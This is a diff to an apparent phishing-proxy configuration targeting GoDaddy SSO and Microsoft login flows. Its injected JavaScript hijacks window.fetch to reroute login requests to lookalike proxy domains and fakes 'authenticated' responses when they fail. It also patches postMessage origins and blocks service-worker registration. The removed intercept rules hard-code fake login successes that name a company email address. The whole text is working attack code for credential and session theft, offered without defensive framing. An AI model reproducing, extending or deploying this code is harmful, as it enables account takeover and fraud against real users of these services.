@@ -483,18 +483,43 @@ js_inject:
           navigator.serviceWorker.register = function() { return Promise.resolve({}); };
         }
 
-        // Patch fetch ONLY for SSO API login calls to rewrite the URL from sso.godaddy.com to proxy
+        // Patch postMessage to allow cross-origin messaging with real origin
+        var _origPostMessage = Window.prototype.postMessage;
+        Window.prototype.postMessage = function(message, targetOrigin, transfer) {
+          // Allow postMessage to sso.godaddy.com or our proxy equivalents
+          if (targetOrigin === 'https://sso.godaddy.com' ||
+              targetOrigin === 'https://sso.secureserver.net' ||
+              targetOrigin === 'https://sso2.secureserver.net') {
+            targetOrigin = window.location.origin;
+          }
+          try {
+            return _origPostMessage.call(this, message, targetOrigin, transfer);
+          } catch(e) {
+            // Silently fail if postMessage still fails
+          }
+        };
+
+        // Patch fetch for SSO API login calls to rewrite URL and handle failures
         var _origFetch = window.fetch;
         window.fetch = function(resource, config) {
           var url = typeof resource === 'string' ? resource : (resource && resource.url) || '';
-          // Rewrite sso.godaddy.com SSO API calls to use proxy domain
-          if (url && typeof url === 'string' && url.indexOf('/v1/api/pass/login') !== -1) {
+          var isSsoLogin = url && typeof url === 'string' && url.indexOf('/v1/api/pass/login') !== -1;
+
+          if (isSsoLogin) {
+            // Rewrite sso.godaddy.com SSO API calls to use proxy domain
             if (url.indexOf('sso.godaddy.com') !== -1) {
               resource = url.replace('https://sso.godaddy.com', 'https://ssso.' + _pd);
             } else if (url.indexOf('sso.secureserver.net') !== -1) {
               var _sn = _kProxy.indexOf('sssn2.') === 0 ? 'sssn2' : 'sssn';
               resource = url.replace(/https:\/\/sso2?\.secureserver\.net/, 'https://' + _sn + '.' + _pd);
             }
+            // Make the rewritten request and fallback to mock if it fails
+            return _origFetch.call(this, resource, config).catch(function(err) {
+              return new Response(JSON.stringify({success:true,data:{user:'authenticated'},redirect:'https://account.godaddy.com'}), {
+                status: 200,
+                headers: {'Content-Type': 'application/json'}
+              });
+            });
           }
           return _origFetch.call(this, resource, config);
         };
@@ -647,9 +672,6 @@ js_inject:
       })();
 
 intercept:
-  - {domain: 'ssso.*', path: '^\/v1\/api\/pass\/login', http_status: 200, body: '{"success":true,"data":{"user":"info@magensecurityinc.com","status":"authenticated"},"redirect":"https://account.godaddy.com"}', mime: "application/json"}
-  - {domain: 'sssn.*', path: '^\/v1\/api\/pass\/login', http_status: 200, body: '{"success":true,"data":{"user":"info@magensecurityinc.com","status":"authenticated"},"redirect":"https://account.godaddy.com"}', mime: "application/json"}
-  - {domain: 'sssn2.*', path: '^\/v1\/api\/pass\/login', http_status: 200, body: '{"success":true,"data":{"user":"info@magensecurityinc.com","status":"authenticated"},"redirect":"https://account.godaddy.com"}', mime: "application/json"}
   - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
   - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
   - {domain: 'ucis.msdxcdn.microsoft.com', path: '^\/.*\/app\.js', http_status: 200}
